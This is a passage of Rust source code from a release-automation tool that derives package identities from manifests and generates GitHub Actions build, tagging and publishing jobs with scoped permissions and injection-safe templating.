    config: &Config,
    publications: &[SelectedPublication],
) -> std::result::Result<Vec<DistinctSubject>, WorkflowDiagnostic> {
    let mut subjects: Vec<DistinctSubject> = Vec::new();
    for publication in publications {
        // Losing this collapse is not visible in the emitted document unless
        // the job identifier changes with it: two subjects deriving one slug
        // derive one job identifier, and the YAML mapping silently keeps the
        // last. The test that proves build-once therefore mutates the slug as
        // well, because that pair is what a real regression looks like. Do not
        // "fix" it by asserting on the collapsed mapping alone.
        if subjects.iter().any(|subject| subject.covers(publication)) {
            continue;
        }
        let unit = &config.release_units[&publication.release_unit];
        subjects.push(DistinctSubject {
            release_unit: publication.release_unit.clone(),
            packager: publication.packager,
            identity: subject_identity(root, unit, publication).map_err(|message| {
                WorkflowDiagnostic::at(
                    "subject-identity-invalid",
                    message,
                    &format!("release-units.{}", publication.release_unit),
                )
            })?,
            working_directory: unit.path.display().to_string(),
            slug: format!(
                "{}_{}",
                identifier(&publication.release_unit),
                identifier(publication.packager.as_str())
            ),
        });
    }
    Ok(subjects)
}

/// Identity the destinations of one subject resolve it by.
///
/// A packager whose native manifest names the published artifact is the
/// authority on that name, because publisher evidence records the same native
/// identity and assembly compares the two. Where the format has no such name,
/// the release-unit id stands in.
///
/// This closed match is the seam, and it is deliberately not a configurable
/// one. [`Packager`] enumerates the maintained recipe catalog, so a destination
/// whose identity is not yet derived here is a packager arm this function has
/// not learned to read, not a value a repository could supply: an identity the
/// workspace could assert would let a release name a subject the destination
/// does not resolve, which is the disagreement the sealed subject exists to
/// catch. A recipe that finds the stand-in reaching its fragment refines this
/// arm; it must never make its fragment record the release-unit id instead,
/// because that agrees with the seal by making both sides wrong and silently
/// retires the cross-check.
///
/// This is also where a subject identity enters the model, so it is where the
/// value is held to a name its ecosystem could publish. Everything downstream
/// treats it as a name: it is written into a `sed` address, printed into a YAML
/// scalar, and passed to an Action. Validating at each of those is a rule the
/// next sink does not inherit, so the value is refused here instead and the
/// diagnostic names the manifest an author has to edit.
fn subject_identity(
    root: &Path,
    unit: &crate::config::ReleaseUnitConfig,
    publication: &SelectedPublication,
) -> std::result::Result<String, String> {
    let directory = root.join(&unit.path);
    // The release-unit identifier is repository content whether or not it
    // stands in as the subject identity: it reaches an Action input, the
    // observation's YAML, and the publication identity verification resolves.
    // So it is held to the rule for every subject, and the manifest name is
    // held to its ecosystem's rule on top of that.
    let unit_origin = format!("release unit {}", publication.release_unit);
    let fallback = names::release_unit(&names::SuppliedName {
        origin: &unit_origin,
        value: &publication.release_unit,
    })?;
    let fallback = Ok(fallback);
    match publication.packager {
        Packager::Npm => {
            let Some(name) = std::fs::read_to_string(directory.join("package.json"))
                .ok()
                .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
                .and_then(|manifest| {
                    manifest
                        .get("name")
                        .and_then(serde_json::Value::as_str)
                        .map(str::to_owned)
                })
            else {
                return fallback;
            };
            names::npm_package(&names::SuppliedName {
                origin: &format!("{} package.json name", unit.path.display()),
                value: &name,
            })
        }
        Packager::Cargo => {
            let Some(name) = std::fs::read_to_string(directory.join("Cargo.toml"))
                .ok()
                .and_then(|text| text.parse::<toml_edit::DocumentMut>().ok())
                .and_then(|manifest| {
                    manifest
                        .get("package")
                        .and_then(|package| package.get("name"))
                        .and_then(|name| name.as_str())
                        .map(str::to_owned)
                })
            else {
                return fallback;
            };
            names::cargo_crate(&names::SuppliedName {
                origin: &format!("{} Cargo.toml package name", unit.path.display()),
                value: &name,
            })
        }
        // GoReleaser names the Homebrew formula, the system packages, and the
        // Arch package from one project name, so that name is what every
        // destination of a Go release unit resolves and it is read from the
        // packager's own configuration.
        Packager::GoReleaser => crate::executor::goreleaser::subject_identity(&directory)
            .ok()
            .flatten()
            .map_or(fallback, Ok),
        // The two OCI packagers are derived rather than stood in for. A Dev
        // Container Feature names itself in `devcontainer-feature.json`. A
        // Dockerfile-backed image names itself in the one place the format has
        // for it, the `org.opencontainers.image.title` label, which is also the
        // annotation its destinations carry, so the derivation reads the name a
        // consumer resolves rather than one the workspace happened to pick.
        //
        // Neither falls back to the release-unit id. A subject the recipe could
        // not name is exactly the state the sealed cross-check exists to
        // refuse, and every OCI destination has to resolve this name, so a
        // stand-in would publish under an identity no consumer asked for.
        Packager::Buildx => {
            let Some(name) = std::fs::read_to_string(directory.join("Dockerfile"))
                .ok()
                .and_then(|text| dockerfile_image_title(&text))
            else {
                return Err(format!(
                    "release unit {} builds an OCI image whose name the derivation cannot read; declare it as a literal {OCI_TITLE_LABEL} label in {}",
                    publication.release_unit,
                    unit.path.join("Dockerfile").display()
                ));
            };
            names::oci_subject(&names::SuppliedName {
                origin: &format!(
                    "{} {OCI_TITLE_LABEL} label",
                    unit.path.join("Dockerfile").display()
                ),
                value: &name,
            })
        }
        Packager::DevContainerCli => {
            let manifest = unit.path.join("devcontainer-feature.json");
            let Some(name) = std::fs::read_to_string(directory.join("devcontainer-feature.json"))
                .ok()
                .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
                .and_then(|manifest| {
                    manifest
                        .get("id")
                        .and_then(serde_json::Value::as_str)
                        .map(str::to_owned)
                })
                .filter(|id| !id.is_empty())
            else {
                return Err(format!(
                    "release unit {} publishes a Dev Container Feature whose id the derivation cannot read from {}",
                    publication.release_unit,
                    manifest.display()
                ));
            };
            names::oci_subject(&names::SuppliedName {
                origin: &format!("{} id", manifest.display()),
                value: &name,
            })
        }
    }
}

/// OCI annotation and Dockerfile label naming a runnable image.
const OCI_TITLE_LABEL: &str = "org.opencontainers.image.title";

/// Read the image name one Dockerfile declares, if it declares one.
///
/// A value built from a build argument names the image at build time rather
/// than in the source the release seals. Nothing here rejects it: the name is
/// accepted against the OCI repository-name grammar, which no expression can
/// satisfy, so refusing it twice would add a rule whose removal changes
/// nothing.
///
/// The last declaration wins, which is the rule the image itself follows: a
/// later stage's label overrides an earlier one, so a multi-stage build whose
/// builder stage carries a different title would otherwise name the subject
/// after a stage the release does not ship.
fn dockerfile_image_title(text: &str) -> Option<String> {
    let mut declared = None;
    let mut logical = String::new();
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with('#') {
            continue;
        }
        match trimmed.strip_suffix('\\') {
            Some(head) => {
                logical.push_str(head.trim_end());
                logical.push(' ');
                continue;
            }
            None => logical.push_str(trimmed),
        }
        let statement = std::mem::take(&mut logical);
        let Some(labels) = statement
            .strip_prefix("LABEL ")
            .or_else(|| statement.strip_prefix("label "))
        else {
            continue;
        };
        if let Some(title) = label_value(labels, OCI_TITLE_LABEL) {
            declared = Some(title);
        }
    }
    declared
}

/// Value one `LABEL` statement assigns to one key, in either quoted form.
fn label_value(labels: &str, key: &str) -> Option<String> {
    for prefix in [format!("{key}="), format!("\"{key}\"=")] {
        let Some(index) = labels.find(&prefix) else {
            continue;
        };
        let rest = &labels[index + prefix.len()..];
        let value = match rest.strip_prefix('"') {
            Some(quoted) => quoted.split('"').next().unwrap_or_default(),
            None => rest.split_whitespace().next().unwrap_or_default(),
        };
        if !value.is_empty() {
            return Some(value.to_owned());
        }
    }
    None
}

fn concurrency(group: &str) -> Value {
    let mut mapping = serde_yaml::Mapping::new();
    mapping.insert(
        Value::String("group".to_owned()),
        Value::String(group.to_owned()),
    );
    mapping.insert(
        Value::String("cancel-in-progress".to_owned()),
        Value::Bool(false),
    );
    Value::Mapping(mapping)
}

/// Managed job identifier for one resolved publication.
fn publication_job_id(namespaces: &PrefixNamespaces, publication: &SelectedPublication) -> String {
    format!(
        "{}publish_{}_{}_{}",
        namespaces.job,
        identifier(&publication.release_unit),
        publication.publisher.as_str(),
        identifier(&publication.target)
    )
}

/// Reduce an arbitrary configured id to a GitHub job identifier fragment.
fn identifier(value: &str) -> String {
    value
        .chars()
        .map(|character| {
            if character.is_ascii_alphanumeric() {
                character.to_ascii_lowercase()
            } else {
                '_'
            }
        })
        .collect()
}

fn render_list(values: &[String]) -> String {
    values
        .iter()
        .map(|value| format!("  - {value}\n"))
        .collect()
}

/// Render one value as a YAML scalar that cannot alter the template's shape.
pub(super) fn scalar(value: &str) -> String {
    serde_yaml::to_string(&Value::String(value.to_owned()))
        .unwrap_or_else(|_| format!("{value:?}"))
        .trim_end()
        .to_owned()
}

/// Parse a managed job template after substituting its derived values.
///
/// Every substituted value that lands in a scalar position is rendered through
/// [`scalar`], and a template that still does not parse is reported rather than
/// panicking: these bodies carry repository-write authority, so an unexpected
/// configuration-derived id must fail loudly, not silently reshape a job.
fn job(
    template: &str,
    namespaces: &PrefixNamespaces,
    extra: &[(&str, &str)],
) -> std::result::Result<Value, WorkflowDiagnostic> {
    let mut rendered = template.to_owned();
    // Derived values are substituted first because a value can itself name a
    // namespace placeholder: a packager's build script refers to the prefixed
    // subject environment variable, and substituting the namespaces first would
    // leave that reference unrendered in a privileged job.
    for (placeholder, value) in extra {
        rendered = rendered.replace(placeholder, value);
    }
    let rendered = rendered
        .replace("@JOB@", &namespaces.job)
        .replace("@ENVVAR@", &namespaces.envvar)
        .replace("@ENVIRONMENT@", &namespaces.environment)
        .replace("@SENTINEL@", OWNERSHIP_SENTINEL)
        .replace("@CONTRACT@", WORKFLOW_CONTRACT)
        .replace("@CHECKOUT@", CHECKOUT_ACTION)
        .replace("@UPLOAD@", UPLOAD_ARTIFACT_ACTION)
        .replace("@DOWNLOAD@", DOWNLOAD_ARTIFACT_ACTION)
        .replace("@APP_TOKEN@", APP_TOKEN_ACTION)
        .replace("@GORELEASER_INSTALL@", GORELEASER_INSTALL_ACTION)
        .replace("@SETUP_QEMU@", SETUP_QEMU_ACTION)
        .replace("@SETUP_BUILDX@", SETUP_BUILDX_ACTION)
        .replace("@GORELEASER_VERSION@", &scalar(GORELEASER_VERSION))
        .replace("@VERSION@", &scalar(crate::VERSION))
        .replace("@PREPARE_ACTION@", &action_reference("prepare-release"))
        .replace(
            "@VERIFY_HANDOFF_ACTION@",
            &action_reference("verify-handoff"),
        )
        .replace(
            "@VERIFY_RELEASE_TAG_ACTION@",
            &action_reference("verify-release-tag"),
        )
        .replace(
            "@VERIFY_PUBLICATION_ACTION@",
            &action_reference("verify-publication"),
        )
        .replace("@ASSEMBLE_ACTION@", &action_reference("assemble-evidence"))
        .replace(
            "@BUILT_SUBJECT_ACTION@",
            &action_reference("record-built-subject"),
        )
        .replace("@TAG_PHASE_ACTION@", &action_reference("seal-phase-tags"));
    serde_yaml::from_str(&rendered).map_err(|error| {
        WorkflowDiagnostic::new(
            "job-template-invalid",
            format!("a managed job template did not render to valid YAML: {error}"),
        )
    })
}

/// Build job producing one distinct subject and recording what it produced.
///
/// The packager writes its bytes to the path the graph names, and the portable
/// command digests exactly those bytes and reads the version from the verified
/// global release tag. Neither value is asserted by the recipe, so a build job
/// cannot record a subject it did not produce or a release it is not part of.
fn build_job(
    namespaces: &PrefixNamespaces,
    verify: &str,
    subject: &DistinctSubject,
    global_tag: &str,
) -> std::result::Result<Value, WorkflowDiagnostic> {
    job(
        PUBLISH_BUILD_JOB,
        namespaces,
        &[
            ("@NEEDS@", &render_list(&[verify.to_owned()])),
            ("@SLUG@", &subject.slug),
            (
                "@BUILD_NAME@",
                &scalar(&format!("Build the {} subject once", subject.identity)),
            ),
            (
                "@RECORD_NAME@",
                &scalar(&format!("Record the built {} subject", subject.identity)),
            ),
            (
                "@UPLOAD_NAME@",
                &scalar(&format!("Upload the built {} subject", subject.identity)),
            ),
            (
                "@DOCUMENT_NAME@",
                &scalar(&format!(
                    "Upload the {} built-subject document",
                    subject.identity
                )),
            ),
            ("@BUILD_COMMAND@", &build_command(subject.packager)),
            ("@BUILD_ENV@", &build_environment(subject, global_tag)),
            ("@TOOLCHAIN_STEPS@", toolchain_steps(subject.packager)),
            ("@RELEASE_UNIT@", &scalar(&subject.release_unit)),
            ("@SUBJECT_IDENTITY@", &scalar(&subject.identity)),
            ("@WORKING_DIRECTORY@", &scalar(&subject.working_directory)),
        ],
    )
}

/// Managed job sealing and publishing the tags one executor phase declares.
fn phase_tag_job(
    namespaces: &PrefixNamespaces,
    phase: TagPhase,
    needs: &[String],
) -> std::result::Result<Value, WorkflowDiagnostic> {
    // Each phase seals a different staged input: the before-publication phase
    // seals the built subjects, the after-publication phase seals the accepted
    // publisher fragments. Both are transported as artifacts of the jobs that
    // produced them and both leave the sealed evidence behind as a document.
    //
    // The sealed documents carry their own artifact prefix rather than the
    // fragment one. Sharing it made the after-publication tag's staged pattern
    // match the before-publication document and its own output, which the
    // loader skipped by schema identity but which nothing in the graph said was
    // intended; assembly reads both prefixes explicitly instead.
    let staged = match phase {
        // The before-publication phase reads documents, not bytes, so it
        // downloads the document-only artifact rather than every subject's
        // build output. Bytes and document still travel together to the
        // publishers, which is where the binding has to hold.
        TagPhase::BeforePublication => "subjectdoc",
        TagPhase::AfterPublication => "evidence",
    };
    job(
        PUBLISH_PHASE_TAG_JOB,
        namespaces,
        &[
            ("@NEEDS@", &render_list(needs)),
            ("@PHASE@", &phase.to_string()),
            ("@STAGED@", staged),
            (
                "@SEAL_NAME@",
                &scalar(&format!("Seal the {phase} release tags")),
            ),
            (
                "@PUSH_NAME@",
                &scalar(&format!("Publish the {phase} release tags")),
            ),
            (
                "@UPLOAD_NAME@",
                &scalar(&format!("Upload the sealed {phase} evidence")),
            ),
        ],
    )
}

/// Publisher job derived from one resolved publication and its recipe.
fn publisher_job(
    root: &Path,
    namespaces: &PrefixNamespaces,
    needs: &[String],
    publication: &SelectedPublication,
    subject: &DistinctSubject,
    config: &Config,
) -> std::result::Result<Value, WorkflowDiagnostic> {
    let unit = &config.release_units[&publication.release_unit];
    // An omitted selector is what chooses an adapter's configured primary
    // destination, so a primary publication passes the Action an empty selector
    // rather than naming `primary` as a target it would have to resolve.
    let target = if publication.target == PRIMARY_TARGET {
        String::new()
    } else {
        publication.target.clone()
    };
    let identity = publication.identity();
    let slug = identifier(&identity);
    let subject_identity = subject.identity.clone();
    // Publisher credentials stay in the repository-owned recipe steps, so the
    // destination readback they perform reaches the portable command as a
    // schema-backed observation rather than as a second verification path.
    let observation = format!(
        "${{{{ runner.temp }}}}/{}observation/{slug}.yml",
        namespaces.job
    );
    let evidence = format!(
        "${{{{ runner.temp }}}}/{}evidence/{slug}.yml",
        namespaces.job
    );
    // The recipe's own steps are written by the module that owns each
    // destination, and they read the sealed subject from the build job's
    // outputs rather than from a value they assert, so the observation they
    // produce is bound to the subject the phase tag sealed.
    let recipe = crate::executor::steps::recipe_steps(&crate::executor::steps::RecipeContext {
        publication,
        unit,
        subject_identity: &subject.identity,
        build_job: &format!("{}build_{}", namespaces.job, subject.slug),
        working_directory: &unit.path.display().to_string(),
        observation: &observation,
        root,
        work: &format!("${{{{ runner.temp }}}}/{}readback/{slug}", namespaces.job),
    })
    .map_err(|refusal| {
        let path = refusal
            .path
            .unwrap_or_else(|| format!("release-units.{}", publication.release_unit));
        WorkflowDiagnostic::at(refusal.code, refusal.message, &path)
    })?;
    let mut substitutions = vec![
        ("@NEEDS@", render_list(needs)),
        ("@SLUG@", slug.clone()),
        ("@SUBJECT_SLUG@", subject.slug.clone()),
        ("@SUBJECT_IDENTITY@", scalar(&subject_identity)),
    ];
    // A draft-dependent publisher's fragment records what it retrieved from the
    // draft Release, and that claim is proved against the inventory the release
    // sealed for this publication. The path is named by the derivation so the
    // job consumes the handoff for its own publication rather than whichever
    // document happens to be on the runner. A publisher whose consumer path
    // reads no draft asset passes none, and the Action turns an empty input into
    // an absent option rather than an empty path.
    let handoff = if crate::publication::draft::is_draft_dependent(publication.publisher) {
        format!(
            "${{{{ runner.temp }}}}/{}handoff/{slug}/{}",
            namespaces.job,
            crate::publication::draft::DRAFT_HANDOFF_FILE
        )
    } else {
        String::new()
    };
    substitutions.extend([
        ("@RECIPE_STEPS@", recipe),
        ("@HANDOFF@", scalar(&handoff)),
        (
            "@WORKING_DIRECTORY@",
            scalar(&unit.path.display().to_string()),
        ),
        (
            "@SUBJECT_NAME@",
            scalar(&format!("Download the built {} subject", subject.identity)),
        ),
        (
            "@VERIFY_NAME@",
            scalar(&format!("Verify the {identity} publication")),
        ),
        (
            "@FRAGMENT_NAME@",
            scalar(&format!("Upload the {identity} evidence fragment")),
        ),
        ("@RELEASE_UNIT@", scalar(&publication.release_unit)),
        ("@PUBLISHER@", scalar(publication.publisher.as_str())),
        ("@TARGET@", scalar(&target)),
        ("@OBSERVATION@", scalar(&observation)),
        ("@OUTPUT@", scalar(&evidence)),
        ("@PERMISSIONS@", publisher_permissions(publication)),
    ]);
    job(
        PUBLISH_PUBLISHER_JOB,
        namespaces,
        &substitutions
            .iter()
            .map(|(placeholder, value)| (*placeholder, value.as_str()))
            .collect::<Vec<_>>(),
    )
}

/// Steps installing the packager the build job runs.
///
/// A stock runner already carries the toolchains its hosted images ship, so most
/// packagers need nothing here. GoReleaser is not one of them: it is a separate
/// command, the build job is the sole producer of every Go deliverable the
/// publisher jobs promote, and a build job that cannot run its packager produces
/// nothing at all.
///
/// The installer is pinned to a complete commit identity for the same reason
/// every other external Action is, and it installs only the command: the release
/// itself is driven by the build step, which is where the graph can see it.
const fn toolchain_steps(packager: Packager) -> &'static str {
    match packager {
        Packager::GoReleaser => {
            "  - name: Install the GoReleaser packager\n    uses: @GORELEASER_INSTALL@\n    with:\n      install-only: true\n      version: @GORELEASER_VERSION@\n"
        }
        // A stock runner's default Buildx builder uses the docker driver, which
        // can neither emit an OCI layout nor build more than the runner's own
        // platform. Both are requirements of the subject this job seals, so the
        // container-driver builder and its emulation are part of the recipe
        // rather than an optimization.
        Packager::Buildx => {
            "  - name: Enable multi-platform image builds\n    uses: @SETUP_QEMU@\n  - name: Start a container-driver Buildx builder\n    uses: @SETUP_BUILDX@\n"
        }
        Packager::Npm | Packager::Cargo | Packager::DevContainerCli => "",
    }
}

/// Native command that produces one subject's bytes without distributing them.
///
/// This is the packager seam the maintained recipes refine. It states the
/// minimal native build each packager performs and where the graph expects its
/// bytes; provenance generation, attached metadata, signatures, and destination
/// alias behaviour belong to the recipe that owns the destination, not here.
fn build_command(packager: Packager) -> String {
    match packager {
        Packager::Npm => "      npm pack --pack-destination \"${@ENVVAR@SUBJECT}\"".to_owned(),
        Packager::Cargo => {
            "      cargo package --locked --target-dir \"${RUNNER_TEMP}/@JOB@cargo\"\n      cp \"${RUNNER_TEMP}\"/@JOB@cargo/package/*.crate \"${@ENVVAR@SUBJECT}/\"".to_owned()
        }
        Packager::GoReleaser => {
            "      goreleaser release --clean --skip=publish,announce\n      cp -R dist/. \"${@ENVVAR@SUBJECT}/\"".to_owned()
        }
        // The index annotations are part of the bytes the release seals, so
        // they are attached here rather than added at a destination later:
        // mutating them at promotion time would give each destination a subject
        // the seal never saw. Revision is the released commit and created is
        // that commit's timestamp, both read from the checkout rather than from
        // the runner's clock, so the same commit annotates the same way on
        // every rerun.
        Packager::Buildx => format!(
            "{RELEASE_VERSION_COMMAND}      created=\"$(git show -s --format=%cI HEAD)\"\n      docker buildx build \\\n        --platform {OCI_IMAGE_PLATFORMS} \\\n        --provenance true \\\n        --sbom true \\\n        --annotation \"index:{OCI_TITLE_LABEL}=${{@ENVVAR@SUBJECT_IDENTITY}}\" \\\n        --annotation \"index:org.opencontainers.image.version=${{version}}\" \\\n        --annotation \"index:org.opencontainers.image.revision=${{GITHUB_SHA}}\" \\\n        --annotation \"index:org.opencontainers.image.created=${{created}}\" \\\n        --annotation \"index:org.opencontainers.image.source=${{GITHUB_SERVER_URL}}/${{GITHUB_REPOSITORY}}\" \\\n        --output \"type=oci,dest=${{@ENVVAR@SUBJECT}}/{OCI_LAYOUT_ARCHIVE}\" ."
        ),
        Packager::DevContainerCli => format!(
            "      npm install --global --no-fund --no-audit --ignore-scripts {DEV_CONTAINER_CLI}\n      devcontainer features package --output-folder \"${{@ENVVAR@SUBJECT}}\" ."
        ),
    }
}

/// Platform matrix every maintained Buildx recipe produces.
///
/// The matrix belongs to the recipe rather than to configuration: it is what
/// makes one subject resolvable from both destinations for both architectures,
/// and a per-repository matrix would let two destinations of one subject
/// disagree about what the release contains.
const OCI_IMAGE_PLATFORMS: &str = "linux/amd64,linux/arm64";

/// Name the Buildx recipe writes its OCI layout archive under.
const OCI_LAYOUT_ARCHIVE: &str = "subject.oci.tar";

/// Dev Container CLI revision the maintained build command drives.
const DEV_CONTAINER_CLI: &str = "@devcontainers/cli@0.88.0";

/// Shell assigning `version` from the global release tag this run was triggered by.
///
/// The tag's template is derivation-time knowledge, so the extraction is exact
/// rather than a pattern guess. The affixes are routed through `env:` rather
/// than spliced, because a configured template is repository text and this body
/// runs beside the checkout.
const RELEASE_VERSION_COMMAND: &str = r#"      version="${GITHUB_REF_NAME}"
      version="${version#"${@ENVVAR@TAG_PREFIX}"}"
      version="${version%"${@ENVVAR@TAG_SUFFIX}"}"
"#;

/// Values one packager's build command reads from its step environment.
///
/// Only the Buildx recipe needs any: it annotates the index it seals, and both
/// the subject name and the release tag's literal affixes are repository text
/// that must reach the body as data rather than as source.
fn build_environment(subject: &DistinctSubject, global_tag: &str) -> String {
    if subject.packager != Packager::Buildx {
        return String::new();
    }
    let (prefix, suffix) = global_tag
        .split_once("{version}")
        .unwrap_or((global_tag, ""));
    format!(
        "      @ENVVAR@SUBJECT_IDENTITY: {}\n      @ENVVAR@TAG_PREFIX: {}\n      @ENVVAR@TAG_SUFFIX: {}\n",
        scalar(&subject.identity),
        scalar(prefix),
        scalar(suffix),
    )
}

/// Least privilege one publication's destination requires.
///
/// The workflow-identity scope is granted to the destinations whose recipes
/// exchange that identity for something: a registry trusted-publishing token,
/// or a provenance attestation bound to the run. A destination that
/// authenticates with a repository-scoped or configured token exchanges nothing
/// and is derived without it, because a job that holds a workflow identity it
/// never presents is a credential sitting in reach of every step in it.
fn publisher_permissions(publication: &SelectedPublication) -> String {
    let mut scopes = vec!["  contents: read\n".to_owned()];
    let packages = matches!(
        (publication.publisher, publication.target.as_str()),
        (PublisherKind::Npm, "github") | (PublisherKind::Oci, "ghcr")
    );
    if packages {
        scopes.push("  packages: write\n".to_owned());
    }
    if presents_a_workflow_identity(publication) {
        scopes.push("  id-token: write\n".to_owned());
    }
    scopes.concat()
}

/// Whether one publication's recipe presents the run's workflow identity.
///
/// Every adapter states its own answer rather than sharing a catch-all. The
/// adapters below npm and Cargo are owned by separate tasks working from a
/// common base, and a catch-all makes an answer each of them has to give
/// separately into one they have to change together.
fn presents_a_workflow_identity(publication: &SelectedPublication) -> bool {
    match (publication.publisher, publication.target.as_str()) {
        // GitHub Package Registry implements neither trusted publishing nor
        // provenance attestation; its recipe presents the workflow token.
        (PublisherKind::Npm, "github") => false,
        (PublisherKind::Npm, _) => true,
        // An alternate Cargo registry defines its own trusted publishing, if
        // any, so the maintained recipe authenticates it with a configured
        // token. Only crates.io performs the identity exchange.
        (PublisherKind::Cargo, _) => publication.destination.as_deref() == Some("crates.io"),
        // A tap, a package index, and the Arch User Repository accept no
        // workflow identity: they are repositories, reached with a narrowly
        // scoped installation token or an SSH key. Granting the scope anyway
        // would widen every one of these jobs for nothing.
        (PublisherKind::Homebrew, _) => false,
        (PublisherKind::Rpm, _) => false,
        (PublisherKind::Apt, _) => false,
        (PublisherKind::Aur, _) => false,
        (PublisherKind::Oci, _) => true,
    }
}

/// Managed job templates.
///
/// Every managed checkout states `fetch-tags: true` rather than inheriting tags
/// from `fetch-depth: 0`. The portable commands these jobs invoke derive
/// version authority and resolve the global release tag from the repository's
/// tags, so anyone shortening the fetch depth to speed a job up would otherwise
/// silently remove a guarantee the release protocol depends on.
///
/// Every `intentional` command a template runs is an argument-level contract
/// with the command-line interface that nothing else in this module checks:
/// workflow derivation never consults the argument parser, and a workflow
/// linter validates syntax and action references rather than the semantics of a
/// `run:` body. The command-line crate parses every generated invocation with
/// the real parser for that reason, so a renamed flag or a changed positional
/// fails there rather than in a privileged job on a release runner.
///
/// The rationale cannot live in the emitted workflow: each template is parsed
/// into a value before it is spliced, and the editor has no comment support, so
/// managed jobs are emitted comment-free by construction.
const RELEASE_PREPARE_JOB: &str = r#"
runs-on: ubuntu-latest
permissions:
  contents: read
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
  - id: @SENTINEL@
    name: Check out the accepted source commit
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
  - name: Construct the release candidate
    uses: @PREPARE_ACTION@
    with:
      output: ${{ runner.temp }}/@JOB@candidate
      intentional-version: @VERSION@
  - name: Upload the release candidate
    uses: @UPLOAD@
    with:
      name: @JOB@candidate
      path: ${{ runner.temp }}/@JOB@candidate
      retention-days: 1
"#;

/// The authority transition, which also creates the draft the publication
/// protocol depends on.
///
/// Creation belongs here rather than in a job of its own because this job
/// already holds the installation token and is the last managed job that runs
/// before the pushed tag can trigger publication. A separate creator would mint
/// repository authority a second time to write a Release the transition could
/// have written while its own token was still live.
///
/// Creation follows the atomic push in the same job for a reason a reader can
/// otherwise talk themselves out of: a draft cannot be created for a tag the
/// remote does not carry, and `--verify-tag` is what turns a reordering into a
/// failure on the runner rather than a Release attached to nothing.
///
/// Creation is create-if-absent, and absent means absent. `gh release view`
/// fails for a Release that does not exist and equally for a rate limit, a 5xx,
/// or a revoked token, so the branch is taken only when the failure says the
/// Release was not found. Reading every failure as absence would turn the one
/// case create-if-absent exists to serve -- a rerun where the draft does exist
/// -- into a hard failure whose message points away from the real cause.
///
/// `immutable-github-release` states that a failure before closure leaves a
/// resumable draft, so a rerun of this job has to find that draft and continue.
/// A Release that exists and is no longer a draft is the opposite case: the
/// release already closed, and continuing would mean uploading assets onto an
/// immutable Release, so the transition refuses.
///
/// The step names its repository rather than inheriting one. The push step
/// rewrote `origin` to embed the installation token, so a `gh` that resolved
/// the repository from the remote would take the Release the whole publication
/// protocol keys on from a URL another step mutated.
const RELEASE_AUTHORITY_JOB: &str = r#"
needs:
@NEEDS@
runs-on: ubuntu-latest
environment: @ENVIRONMENT@
permissions:
  contents: read
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
  - id: @SENTINEL@
    name: Check out the repository without persisted credentials
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
  - name: Download the release candidate
    uses: @DOWNLOAD@
    with:
      name: @JOB@candidate
      path: ${{ runner.temp }}/@JOB@candidate
  - id: @JOB@handoff
    name: Verify the release candidate handoff
    uses: @VERIFY_HANDOFF_ACTION@
    with:
      handoff: ${{ runner.temp }}/@JOB@candidate
      intentional-version: @VERSION@
  - id: @JOB@token
    name: Mint a short-lived repository token
    uses: @APP_TOKEN@
    with:
      app-id: ${{ vars.@ENVVAR@GITHUB_APP_ID }}
      private-key: ${{ secrets.@ENVVAR@GITHUB_APP_PRIVATE_KEY }}
  - name: Publish the release commit and the global release tag
    env:
      @ENVVAR@SOURCE_SHA: ${{ steps.@JOB@handoff.outputs.source-sha }}
      @ENVVAR@RELEASE_SHA: ${{ steps.@JOB@handoff.outputs.release-sha }}
      @ENVVAR@GLOBAL_TAG: ${{ steps.@JOB@handoff.outputs.global-tag }}
      @ENVVAR@DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
      GITHUB_TOKEN: ${{ steps.@JOB@token.outputs.token }}
    run: |
      set -euo pipefail
      git remote set-url origin \
        "https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
      observed="$(git ls-remote origin "refs/heads/${@ENVVAR@DEFAULT_BRANCH}" | cut -f1)"
      test "${observed}" = "${@ENVVAR@SOURCE_SHA}"
      git push --atomic origin \
        "${@ENVVAR@RELEASE_SHA}:refs/heads/${@ENVVAR@DEFAULT_BRANCH}" \
        "refs/tags/${@ENVVAR@GLOBAL_TAG}"
  - name: Create the draft GitHub Release for the published tag
    env:
      GH_TOKEN: ${{ steps.@JOB@token.outputs.token }}
      GH_REPO: ${{ github.repository }}
      @ENVVAR@GLOBAL_TAG: ${{ steps.@JOB@handoff.outputs.global-tag }}
    run: |
      set -euo pipefail
      viewed="$(gh release view "${@ENVVAR@GLOBAL_TAG}" \
        --json isDraft --jq '.isDraft' 2>&1)" && resolved=0 || resolved=$?
      if test "${resolved}" -eq 0; then
        test "${viewed}" = "true"
      else
        if ! printf '%s\n' "${viewed}" | grep -qi 'release not found'; then
          printf 'the draft Release could not be resolved: %s\n' "${viewed}" >&2
          exit 1
        fi
        gh release create "${@ENVVAR@GLOBAL_TAG}" --draft --verify-tag \
          --title "${@ENVVAR@GLOBAL_TAG}" --notes ''
      fi
"#;

const PUBLISH_VERIFY_JOB: &str = r#"
runs-on: ubuntu-latest
permissions:
  contents: read
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
  - id: @SENTINEL@
    name: Check out the released commit
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
  - name: Verify the global release tag
    uses: @VERIFY_RELEASE_TAG_ACTION@
    with:
      intentional-version: @VERSION@
"#;

/// Build job for one distinct publishable subject.
///
/// The bytes and the built-subject document travel together in one artifact:
/// the tag job reads the document and the publisher jobs promote the bytes, and
/// a transport that separated them would let a publisher receive bytes no
/// phase tag ever sealed.
///
/// The version and digest the recording step derived are projected as job
/// outputs because a publisher recipe writes both into its observation and
/// assembly compares them against what the phase tag sealed. Routing them
/// through the graph is what makes them the build's values: a recipe that read
/// a version out of its own package manifest could publish under a version the
/// release plan never assigned and still agree with itself.
const PUBLISH_BUILD_JOB: &str = r#"
needs:
@NEEDS@
runs-on: ubuntu-latest
permissions:
  contents: read
outputs:
  version: ${{ steps.@JOB@record.outputs.version }}
  digest: ${{ steps.@JOB@record.outputs.digest }}
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
